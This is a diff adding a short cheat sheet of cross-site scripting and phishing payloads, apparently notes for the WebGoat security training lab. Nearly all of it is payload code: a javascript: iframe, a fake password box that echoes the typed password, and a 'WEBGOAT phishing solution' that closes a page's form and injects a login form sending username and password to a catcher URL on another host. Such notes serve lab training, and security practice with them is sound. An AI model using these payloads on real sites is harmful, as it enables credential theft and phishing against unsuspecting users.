@@ -1,0 +1,22 @@
+## IFRAMES
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+##Fake login form
+Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
+
+##Common pitfalls
+document.cookie     NOT document.cookie()
+
+##Form example (phishing)
+<form action="action_page.php">
+  Username:<br>
+  <input type="text" name="username" value="">
+  <br>
+  Password:<br>
+  <input type="password" name="password" value="">
+  <br><br>
+  <input type="submit" value="Submit">
+</form>
+
+//WEBGOAT phishing solution
+</form><form action="http://192.168.47.140/webgoat/catcher?PROPERTY=yes" method="get">   Username:<br>   <input type="text" name="username" value="">   <br>   Password:<br>   <input type="password" name="password" value="">   <br><br>   <input type="submit" value="Submit"> </form>
